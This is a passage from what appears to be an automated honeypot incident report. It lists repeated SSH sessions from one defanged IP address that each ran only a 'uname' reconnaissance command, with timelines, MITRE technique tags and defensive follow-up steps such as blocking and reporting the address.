| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:45:54` | `cowrie.session.connect` |
| `2026-06-03 11:45:54` | `cowrie.client.version` |
| `2026-06-03 11:45:54` | `cowrie.client.kex` |
| `2026-06-03 11:45:55` | `cowrie.login.success` |
| `2026-06-03 11:45:56` | `cowrie.session.params` |
| `2026-06-03 11:45:56` | `cowrie.command.input` |
| `2026-06-03 11:45:56` | `cowrie.log.closed` |
| `2026-06-03 11:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dfc89a4c23f

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:47 |
| **Last Seen** | 2026-06-03 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:47:08` | `cowrie.session.connect` |
| `2026-06-03 11:47:08` | `cowrie.client.version` |
| `2026-06-03 11:47:09` | `cowrie.client.kex` |
| `2026-06-03 11:47:10` | `cowrie.login.success` |
| `2026-06-03 11:47:10` | `cowrie.session.params` |
| `2026-06-03 11:47:10` | `cowrie.command.input` |
| `2026-06-03 11:47:10` | `cowrie.log.closed` |
| `2026-06-03 11:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82592510d26d

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:47 |
| **Last Seen** | 2026-06-03 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:47:14` | `cowrie.session.connect` |
| `2026-06-03 11:47:14` | `cowrie.client.version` |
| `2026-06-03 11:47:14` | `cowrie.client.kex` |
| `2026-06-03 11:47:16` | `cowrie.login.success` |
| `2026-06-03 11:47:16` | `cowrie.session.params` |
| `2026-06-03 11:47:16` | `cowrie.command.input` |
| `2026-06-03 11:47:16` | `cowrie.log.closed` |
| `2026-06-03 11:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e327e384b4

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:47 |
| **Last Seen** | 2026-06-03 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:47:20` | `cowrie.session.connect` |
| `2026-06-03 11:47:20` | `cowrie.client.version` |
| `2026-06-03 11:47:20` | `cowrie.client.kex` |
| `2026-06-03 11:47:22` | `cowrie.login.success` |
| `2026-06-03 11:47:22` | `cowrie.session.params` |
| `2026-06-03 11:47:22` | `cowrie.command.input` |
| `2026-06-03 11:47:22` | `cowrie.log.closed` |
| `2026-06-03 11:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6efed8d9ef9

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:47 |
| **Last Seen** | 2026-06-03 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:47:26` | `cowrie.session.connect` |
| `2026-06-03 11:47:26` | `cowrie.client.version` |
| `2026-06-03 11:47:26` | `cowrie.client.kex` |
| `2026-06-03 11:47:27` | `cowrie.login.success` |
| `2026-06-03 11:47:27` | `cowrie.session.params` |
| `2026-06-03 11:47:27` | `cowrie.command.input` |
| `2026-06-03 11:47:28` | `cowrie.log.closed` |
| `2026-06-03 11:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a703328f3ed

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:47 |
| **Last Seen** | 2026-06-03 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:47:32` | `cowrie.session.connect` |
| `2026-06-03 11:47:32` | `cowrie.client.version` |
| `2026-06-03 11:47:32` | `cowrie.client.kex` |
| `2026-06-03 11:47:33` | `cowrie.login.success` |
| `2026-06-03 11:47:33` | `cowrie.session.params` |
| `2026-06-03 11:47:33` | `cowrie.command.input` |
| `2026-06-03 11:47:33` | `cowrie.log.closed` |
| `2026-06-03 11:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad24072e322

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:49 |
| **Last Seen** | 2026-06-03 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:49:22` | `cowrie.session.connect` |
| `2026-06-03 11:49:22` | `cowrie.client.version` |
| `2026-06-03 11:49:22` | `cowrie.client.kex` |
| `2026-06-03 11:49:23` | `cowrie.login.success` |
| `2026-06-03 11:49:23` | `cowrie.session.params` |
| `2026-06-03 11:49:23` | `cowrie.command.input` |
| `2026-06-03 11:49:23` | `cowrie.log.closed` |
| `2026-06-03 11:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d432faf7c6b6

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:50 |
| **Last Seen** | 2026-06-03 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:50:09` | `cowrie.session.connect` |
| `2026-06-03 11:50:09` | `cowrie.client.version` |
| `2026-06-03 11:50:09` | `cowrie.client.kex` |
| `2026-06-03 11:50:10` | `cowrie.login.success` |
| `2026-06-03 11:50:11` | `cowrie.session.params` |
| `2026-06-03 11:50:11` | `cowrie.command.input` |
| `2026-06-03 11:50:11` | `cowrie.log.closed` |
| `2026-06-03 11:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a7c374f072e

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:50 |
| **Last Seen** | 2026-06-03 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:50:14` | `cowrie.session.connect` |
| `2026-06-03 11:50:15` | `cowrie.client.version` |
| `2026-06-03 11:50:15` | `cowrie.client.kex` |
| `2026-06-03 11:50:16` | `cowrie.login.success` |
| `2026-06-03 11:50:17` | `cowrie.session.params` |
| `2026-06-03 11:50:17` | `cowrie.command.input` |
| `2026-06-03 11:50:17` | `cowrie.log.closed` |
| `2026-06-03 11:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8965c5c5c251

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:50 |
| **Last Seen** | 2026-06-03 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:50:20` | `cowrie.session.connect` |
| `2026-06-03 11:50:20` | `cowrie.client.version` |
| `2026-06-03 11:50:20` | `cowrie.client.kex` |
| `2026-06-03 11:50:22` | `cowrie.login.success` |
| `2026-06-03 11:50:22` | `cowrie.session.params` |
| `2026-06-03 11:50:22` | `cowrie.command.input` |
| `2026-06-03 11:50:22` | `cowrie.log.closed` |
| `2026-06-03 11:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec2e2de3df0

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:50 |
| **Last Seen** | 2026-06-03 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:50:26` | `cowrie.session.connect` |
| `2026-06-03 11:50:26` | `cowrie.client.version` |
| `2026-06-03 11:50:26` | `cowrie.client.kex` |
| `2026-06-03 11:50:28` | `cowrie.login.success` |
| `2026-06-03 11:50:28` | `cowrie.session.params` |
| `2026-06-03 11:50:28` | `cowrie.command.input` |
| `2026-06-03 11:50:28` | `cowrie.log.closed` |
| `2026-06-03 11:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a582189a8a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:50 |
| **Last Seen** | 2026-06-03 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:50:32` | `cowrie.session.connect` |
| `2026-06-03 11:50:32` | `cowrie.client.version` |
| `2026-06-03 11:50:32` | `cowrie.client.kex` |
| `2026-06-03 11:50:34` | `cowrie.login.success` |
| `2026-06-03 11:50:34` | `cowrie.session.params` |
| `2026-06-03 11:50:34` | `cowrie.command.input` |
| `2026-06-03 11:50:34` | `cowrie.log.closed` |
| `2026-06-03 11:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543f54d93e2f

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:51 |
| **Last Seen** | 2026-06-03 11:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:51:41` | `cowrie.session.connect` |
| `2026-06-03 11:51:41` | `cowrie.client.version` |
| `2026-06-03 11:51:41` | `cowrie.client.kex` |
| `2026-06-03 11:51:43` | `cowrie.login.success` |
| `2026-06-03 11:51:43` | `cowrie.session.params` |
| `2026-06-03 11:51:43` | `cowrie.command.input` |
| `2026-06-03 11:51:43` | `cowrie.log.closed` |
| `2026-06-03 11:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e32fea03775

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:52 |
| **Last Seen** | 2026-06-03 11:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:52:39` | `cowrie.session.connect` |
| `2026-06-03 11:52:39` | `cowrie.client.version` |
| `2026-06-03 11:52:39` | `cowrie.client.kex` |
| `2026-06-03 11:52:41` | `cowrie.login.success` |
| `2026-06-03 11:52:41` | `cowrie.session.params` |
| `2026-06-03 11:52:41` | `cowrie.command.input` |
| `2026-06-03 11:52:41` | `cowrie.log.closed` |
| `2026-06-03 11:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052509a8116f

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:52 |
| **Last Seen** | 2026-06-03 11:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:52:45` | `cowrie.session.connect` |
| `2026-06-03 11:52:45` | `cowrie.client.version` |
| `2026-06-03 11:52:45` | `cowrie.client.kex` |
| `2026-06-03 11:52:46` | `cowrie.login.success` |
| `2026-06-03 11:52:47` | `cowrie.session.params` |
| `2026-06-03 11:52:47` | `cowrie.command.input` |
| `2026-06-03 11:52:47` | `cowrie.log.closed` |
| `2026-06-03 11:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b779f197f24

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:52 |
| **Last Seen** | 2026-06-03 11:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:52:51` | `cowrie.session.connect` |
| `2026-06-03 11:52:51` | `cowrie.client.version` |
| `2026-06-03 11:52:51` | `cowrie.client.kex` |
| `2026-06-03 11:52:52` | `cowrie.login.success` |
| `2026-06-03 11:52:53` | `cowrie.session.params` |
| `2026-06-03 11:52:53` | `cowrie.command.input` |
| `2026-06-03 11:52:53` | `cowrie.log.closed` |
| `2026-06-03 11:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f17d8c0472a8

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:52 |
| **Last Seen** | 2026-06-03 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:52:57` | `cowrie.session.connect` |
| `2026-06-03 11:52:57` | `cowrie.client.version` |
| `2026-06-03 11:52:57` | `cowrie.client.kex` |
| `2026-06-03 11:52:58` | `cowrie.login.success` |
| `2026-06-03 11:52:58` | `cowrie.session.params` |
| `2026-06-03 11:52:58` | `cowrie.command.input` |
| `2026-06-03 11:52:59` | `cowrie.log.closed` |
| `2026-06-03 11:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf4b412a58e

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:53 |
| **Last Seen** | 2026-06-03 11:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:53:20` | `cowrie.session.connect` |
| `2026-06-03 11:53:20` | `cowrie.client.version` |
| `2026-06-03 11:53:21` | `cowrie.client.kex` |
| `2026-06-03 11:53:22` | `cowrie.login.success` |
| `2026-06-03 11:53:22` | `cowrie.session.params` |
| `2026-06-03 11:53:22` | `cowrie.command.input` |
| `2026-06-03 11:53:23` | `cowrie.log.closed` |
| `2026-06-03 11:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d23a1f7a6d4

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:54 |
| **Last Seen** | 2026-06-03 11:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:54:24` | `cowrie.session.connect` |
| `2026-06-03 11:54:24` | `cowrie.client.version` |
| `2026-06-03 11:54:25` | `cowrie.client.kex` |
| `2026-06-03 11:54:26` | `cowrie.login.success` |
| `2026-06-03 11:54:26` | `cowrie.session.params` |
| `2026-06-03 11:54:26` | `cowrie.command.input` |
| `2026-06-03 11:54:26` | `cowrie.log.closed` |
| `2026-06-03 11:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e687b7f11f0

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:54 |
| **Last Seen** | 2026-06-03 11:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:54:30` | `cowrie.session.connect` |
| `2026-06-03 11:54:30` | `cowrie.client.version` |
| `2026-06-03 11:54:30` | `cowrie.client.kex` |
| `2026-06-03 11:54:31` | `cowrie.login.success` |
| `2026-06-03 11:54:32` | `cowrie.session.params` |
| `2026-06-03 11:54:32` | `cowrie.command.input` |
| `2026-06-03 11:54:32` | `cowrie.log.closed` |
| `2026-06-03 11:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287e92104e27

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:54 |
| **Last Seen** | 2026-06-03 11:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:54:36` | `cowrie.session.connect` |
| `2026-06-03 11:54:36` | `cowrie.client.version` |
| `2026-06-03 11:54:36` | `cowrie.client.kex` |
| `2026-06-03 11:54:37` | `cowrie.login.success` |
| `2026-06-03 11:54:38` | `cowrie.session.params` |
| `2026-06-03 11:54:38` | `cowrie.command.input` |
| `2026-06-03 11:54:38` | `cowrie.log.closed` |
| `2026-06-03 11:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73f53b4b3b17

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:55 |
| **Last Seen** | 2026-06-03 11:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:55:40` | `cowrie.session.connect` |
| `2026-06-03 11:55:40` | `cowrie.client.version` |
| `2026-06-03 11:55:40` | `cowrie.client.kex` |
| `2026-06-03 11:55:41` | `cowrie.login.success` |
| `2026-06-03 11:55:42` | `cowrie.session.params` |
| `2026-06-03 11:55:42` | `cowrie.command.input` |
| `2026-06-03 11:55:42` | `cowrie.log.closed` |
| `2026-06-03 11:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a884b6e3801

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:55 |
| **Last Seen** | 2026-06-03 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:55:46` | `cowrie.session.connect` |
| `2026-06-03 11:55:46` | `cowrie.client.version` |
| `2026-06-03 11:55:46` | `cowrie.client.kex` |
| `2026-06-03 11:55:47` | `cowrie.login.success` |
| `2026-06-03 11:55:48` | `cowrie.session.params` |
| `2026-06-03 11:55:48` | `cowrie.command.input` |
| `2026-06-03 11:55:48` | `cowrie.log.closed` |
| `2026-06-03 11:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-180b071d1f38

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:55 |
| **Last Seen** | 2026-06-03 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:55:52` | `cowrie.session.connect` |
| `2026-06-03 11:55:52` | `cowrie.client.version` |
| `2026-06-03 11:55:52` | `cowrie.client.kex` |
| `2026-06-03 11:55:53` | `cowrie.login.success` |
| `2026-06-03 11:55:53` | `cowrie.session.params` |
| `2026-06-03 11:55:53` | `cowrie.command.input` |
| `2026-06-03 11:55:53` | `cowrie.log.closed` |
| `2026-06-03 11:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5d93168d91

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:55 |
| **Last Seen** | 2026-06-03 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:55:57` | `cowrie.session.connect` |
| `2026-06-03 11:55:57` | `cowrie.client.version` |
| `2026-06-03 11:55:58` | `cowrie.client.kex` |
| `2026-06-03 11:55:59` | `cowrie.login.success` |
| `2026-06-03 11:55:59` | `cowrie.session.params` |
| `2026-06-03 11:55:59` | `cowrie.command.input` |
| `2026-06-03 11:55:59` | `cowrie.log.closed` |
| `2026-06-03 11:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43546e29a183

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:56 |
| **Last Seen** | 2026-06-03 11:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:56:03` | `cowrie.session.connect` |
| `2026-06-03 11:56:03` | `cowrie.client.version` |
| `2026-06-03 11:56:04` | `cowrie.client.kex` |
| `2026-06-03 11:56:05` | `cowrie.login.success` |
| `2026-06-03 11:56:05` | `cowrie.session.params` |
| `2026-06-03 11:56:05` | `cowrie.command.input` |
| `2026-06-03 11:56:05` | `cowrie.log.closed` |
| `2026-06-03 11:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaaea61334f4

| Field | Detail |
